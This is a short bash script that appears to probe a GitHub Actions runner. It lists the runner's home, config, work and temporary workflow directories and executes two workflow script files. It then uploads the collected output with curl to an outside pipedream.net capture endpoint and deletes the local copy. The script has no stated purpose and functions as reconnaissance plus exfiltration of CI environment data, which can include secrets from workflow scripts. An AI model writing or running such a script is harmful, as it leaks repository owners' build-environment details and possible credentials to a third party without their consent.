#!/bin/bash

echo "--- START ---" > /tmp/file.txt

echo "--- /home/runner" >> /tmp/file.txt
ls -1la /home/runner >> /tmp/file.txt
echo "--- /home/runner/.config" >> /tmp/file.txt
ls -1la /home/runner/.config >> /tmp/file.txt

echo "--- /home/runner/runners" >> /tmp/file.txt
ls -1la /home/runner/runners >> /tmp/file.txt
echo "--- /home/runner/runners/2.283.3" >> /tmp/file.txt
ls -1la /home/runner/runners/2.283.3 >> /tmp/file.txt
echo "--- /home/runner/warmup " >> /tmp/file.txt
ls -1la /home/runner/warmup >> /tmp/file.txt

echo "--- home/runner/work" >> /tmp/file.txt
ls -1la /home/runner/work >> /tmp/file.txt
echo "--- home/runner/work/_temp" >> /tmp/file.txt
ls -1la /home/runner/work/_temp >> /tmp/file.txt

echo "--- S" >> /tmp/file.txt
$(cat /home/runner/work/1af2d6a1-a315-4075-9b10-b5747cd537dd.sh) >> /tmp/file.txt
echo "--- SF" >> /tmp/file.txt
$(cat /home/runner/work/3cbe4f6b-dc4e-4d8f-9e7c-b9f9768caa57.sh) >> /tmp/file.txt
echo "--- F" >> /tmp/file.txt

echo "--- home/runner/work/_temp/_github_workflow" >> /tmp/file.txt
ls -1la /home/runner/work/_temp/_github_workflow >> /tmp/file.txt
echo "--- home/runner/work/_temp/_runner_file_commands" >> /tmp/file.txt
ls -1la /home/runner/work/_temp/_runner_file_commands >> /tmp/file.txt

#ls -1la /home/runner/perflog >> /tmp/file.txt
#echo "---" >> /tmp/file.txt
#$(cat /home/runner/perflog/Runner.perf) >> /tmp/file.txt
#echo "---" >> /tmp/file.txt
#$(cat /home/runner/perflog/Worker.perf) >> /tmp/file.txt
#echo "--- dale" >> /tmp/file.txt
#$(perf report -i /home/runner/perflog/Worker.perf) >> /tmp/file.txt
#echo "--- FINISH ---" >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/

rm /tmp/file.txt
